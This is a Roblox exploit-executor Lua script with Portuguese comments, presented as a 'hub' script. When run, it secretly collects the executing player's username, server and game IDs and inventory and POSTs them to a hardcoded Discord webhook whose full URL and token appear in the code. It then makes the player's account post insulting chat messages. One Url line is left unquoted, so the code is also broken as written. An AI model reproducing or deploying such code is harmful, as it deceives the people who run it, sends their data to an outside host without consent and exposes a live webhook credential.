local function sendToDiscord(player)
    -- Verifica se o executor suporta requisições HTTP
    local request = http_request or request or syn and syn.request or http and http.request
    if not request then
        warn("Executor não suporta HTTP Requests.")
        return
    end

    -- Coloque o seu Webhook URL aqui
    local Webhook_URL = "https://discord.com/api/webhooks/1350876457517318254/HMIlsRZObF5P1enwtyk9rCN1s-_vHjsi5iCmMn6hNHsKm5muKpalEm_enlqHpqnzmxH1"

    -- Obtém o nome do jogador, data/hora, ID do servidor e ID do jogo
    local username = player.Name
    local dateTime = os.date("%d/%m/%Y %H:%M:%S")
    local serverId = game.JobId
    local gameId = game.PlaceId

    -- Coleta os itens do inventário do jogador (Backpack e Character)
    local inventory = {}
    if player:FindFirstChild("Backpack") then
        for _, item in pairs(player.Backpack:GetChildren()) do
            table.insert(inventory, item.Name)
        end
    end
    if player.Character then
        for _, item in pairs(player.Character:GetChildren()) do
            if item:IsA("Tool") then
                table.insert(inventory, item.Name)
            end
        end
    end
    local inventoryList = #inventory > 0 and table.concat(inventory, ", ") or "Nenhum item encontrado."

    -- Formata a mensagem para enviar
    local message = string.format([[
**CLEITI6966 HUBS - ANTI MANDRAKE SYSTEM** 🔥
-----------------------------------------
👤 **Usuário:** %s
📅 **Data e Hora:** %s
🖥️ **ID do Servidor:** %s
🎮 **ID do Jogo:** %s
🎒 **Itens no Inventário:** %s
-----------------------------------------
> **Atenção:** Quem está lendo isso é....... gay
    ]], username, dateTime, serverId, gameId, inventoryList)

    -- Dados a serem enviados no corpo da requisição
    local data = {
        content = message
    }

    print("Tentando enviar mensagem para o Discord...")
    -- Envia a requisição para o Webhook do Discord
    local success, response = pcall(function()
        return request({
            Url = https://discord.com/api/webhooks/1350876457517318254/HMIlsRZObF5P1enwtyk9rCN1s-_vHjsi5iCmMn6hNHsKm5muKpalEm_enlqHpqnzmxH1,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(data)
        })
    end)

    -- Verifica se a requisição foi bem-sucedida
    if not success then
        warn("Erro ao enviar para o Discord: " .. tostring(response))
    else
        print("Mensagem enviada para o Discord: " .. response.Body)
    end

    print("--------------------------------------------------------------")

    -- Envia mensagens no chat
    -- Primeira mensagem
    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("BOA NOITE A SUA MÃE 😈😈😈😈😈😈😈", "All")

    -- Espera um pouco para enviar a próxima mensagem
    wait(2)

    -- Segunda mensagem
    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("MEU PAL PARA TODAS ELAS QUE EXECUTARAM O SCRIPT!😈😈😈😈😈", "All")
end

-- Executa a função
sendToDiscord(game.Players.LocalPlayer)
